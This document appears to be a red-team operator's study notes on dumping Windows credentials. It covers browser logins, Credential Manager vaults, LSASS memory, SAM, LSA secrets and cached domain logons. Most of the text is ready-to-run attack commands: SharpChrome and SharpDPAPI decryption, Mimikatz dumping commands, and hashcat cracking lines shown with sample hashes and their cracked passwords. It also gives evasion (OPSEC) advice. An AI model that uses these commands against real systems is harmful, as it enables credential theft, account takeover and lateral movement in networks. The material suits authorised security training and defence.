Credentials from Web Browsers

- browsers store credentials using Windows Data Protection API (DPAPI) in a local database.
- Most Chromium-based browsers keep a sql lite database at: %LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data
- Chrome stores them at: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

SharpChrome can automatically read and decrypt credentials: (medium integrity context)
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
-----------------------------------------------------------------------

Windows Credential Manager

Stores creds that users asked to be stored such as RDP.
vaultcmd <-- can be used to show the presence of any saved creds.

run vaultcmd /listcreds:"Windows Credentials" /all

Can also use seatbelts "WindowsVault"

execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

SharpDPAPI can automate pricess of decrypting the blobs

execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
-- credentials command will search through saved cred blobs for current user and decrypt them
-- /rpc arg can be used to leverage MS backupkey remote to ask dc to decrypt the AES key for us.
-----------------------------------------------------------------------

OS Credential Dumping

Below techniques require SYSTEM privileges to the Computer

LSASS Memory (Local Security Authority Subsystem Service (LSASS) 

- handles passowrd functions like verifying, changes, creatign access tokens, etc..
- SSPI (Security Support Provider Interface) which MS version of (Generic Security Service API) GSSAPI
-SSPI's provide different auth for windows

Mimikatz  can be used to dump these credentials
- ! makes mimikatz elevate to system, which is required to have for lsadump::sam
- @ makes mimikatz imersonate eacons thread token, good for impersonating users and commands such as lsadump::dcsync
-----------------------------------------------------------------------
NTLM Hashes
logonpasswords <-- alias for mimkatz sekurlsa::logonpasswords
NTLM hashes can be cracked in hashcat: .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
The hashes cab also be used in pass the hash attacks pth
-----------------------------------------------------------------------
Kerberos Keys
mimikats sekurlsa::ekeys <-- dumps kerberos encryption keys

Note that Mimikatz incorrectly labels each hash as des_cbc_md4.  The hash at the top has a length of 64 and is aes256-cts-hmac-sha1-96.  You may also see aes128-cts-hmac-sha1-96 and rc4_hmac which are 32 in length.

Can be cracked but much slower then NTLM: Hashcat is $krb5db$18$<username>$<DOMAIN-FQDN>$<hash> and can be cracked using hash mode 28900. Beter to request kerberos tickets

.\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
$krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!

OPSEC

Lsass dumping is a bad idea from opsec many tools will detect it
-----------------------------------------------------------------------
Security Account Manager (SAM) stores credentials for local accounts across the 
- HKLM\sam and HKLM\system hives
Adversary may extract the usernames and password hashesfrom the database.

mimikatz !lsadump::sam
-----------------------------------------------------------------------
LSA Secrets
- protected storage used by the LSA (LocalSecurity Authority)
- can possibly extract the cached in memory r directly from: HKLM/Security/Policy/Secrets hivethey are encrypted but keys are stored in HKLM/Security/Policy
mimikatz !lsadump::secrets (will automate the process)
-----------------------------------------------------------------------

Cached Domain Credentials

Think logons for laptops that connect to a network that need to access laptop when they are offline, till the ycan get on the network. 
default windows is configured to store 10, count is in CachedLogonCount key of HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

These can not be used for PTH, they need to be cracked and clear text used. stored in MsCacheV2 format, iteration count is a must know for cracking

mimikatz !lsadump::cache

Can be cracked but very slow

.\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!

-----------------------------------------------------------------------

Kerberos Tickets
